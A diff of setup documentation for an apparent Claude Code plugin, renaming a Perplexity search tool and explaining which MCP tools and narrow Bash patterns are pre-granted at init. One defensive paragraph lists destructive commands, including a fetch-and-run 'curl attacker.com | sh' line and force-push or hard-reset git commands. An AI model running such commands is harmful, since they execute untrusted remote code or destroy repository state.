@@ -344,7 +344,7 @@ Write project settings so the plugin auto-loads on subsequent launches AND all i
       "mcp__plugin_agent-kevin_kevin__task_scan",
       "mcp__plugin_agent-kevin_kevin__task_thread",
       "mcp__plugin_agent-kevin_kevin__task_update",
-      "mcp__plugin_agent-kevin_perplexity__perplexity_search"
+      "mcp__plugin_agent-kevin_kevin__perplexity_search"
     ]
   }
 }
@@ -352,7 +352,7 @@ Write project settings so the plugin auto-loads on subsequent launches AND all i
 
 **Why no `extraKnownMarketplaces` entry?** The marketplace registration was already saved to the user's global `~/.claude/settings.json` when they first ran `/plugin marketplace add` (Option A) or were prompted to trust the marketplace (Option B). Duplicating it in project settings is redundant — only `enabledPlugins` is needed here to opt this specific home into agent-kevin.
 
-**Why pre-grant the full plugin MCP surface at init time?** Plugin-bundled tools can't be granted via the plugin's own `settings.json` — Claude Code only honors `agent`/`subagentStatusLine` keys at the plugin root and silently ignores everything else. The project-level `<HOME>/.claude/settings.json` is the canonical place, so granting all 25 plugin tools here (24 from the `kevin` server + `perplexity_search` from the bundled `perplexity` server) means the user consents once (by running `/init`) and tool calls never re-prompt afterwards. They can revoke individual entries by editing the file. The perplexity server is plugin-bundled so it auto-loads on every session — but it stays inert until `PERPLEXITY_API_KEY` lands in `settings.local.json` via Step 8's Browser pack walk (or `/agent-kevin:configure-skills` later).
+**Why pre-grant the full plugin MCP surface at init time?** Plugin-bundled tools can't be granted via the plugin's own `settings.json` — Claude Code only honors `agent`/`subagentStatusLine` keys at the plugin root and silently ignores everything else. The project-level `<HOME>/.claude/settings.json` is the canonical place, so granting the full `kevin` MCP surface here (25 tools — including `perplexity_search`, which wraps the Perplexity Search API natively) means the user consents once (by running `/init`) and tool calls never re-prompt afterwards. They can revoke individual entries by editing the file. `perplexity_search` is callable on every session but stays inert until `PERPLEXITY_API_KEY` lands in `settings.local.json` via Step 8's Browser pack walk (or `/agent-kevin:configure-skills` later).
 
 **Why the Bash entries are scoped this narrowly:** broad patterns like `Bash(git *)` or `Bash(curl *)` would also authorize destructive forms (`git push --force`, `git reset --hard`, `curl attacker.com | sh`). The patterns above cover the read-mostly + scaffold-creation commands core skills actually use (`git log/status/diff/config`, `date`, `readlink`, `ls`, `find`, `cat`, `mkdir -p`, `test`, `echo`) — nothing that mutates source-control state or hits the network. **Network/curl is intentionally NOT pre-granted anywhere** — `wordpress-rest` and any other skill that makes outbound HTTP confirms on first call; the user picks "Always allow" to lock the grant to their actual URL pattern (much tighter than blanket `Bash(curl *)`).
 
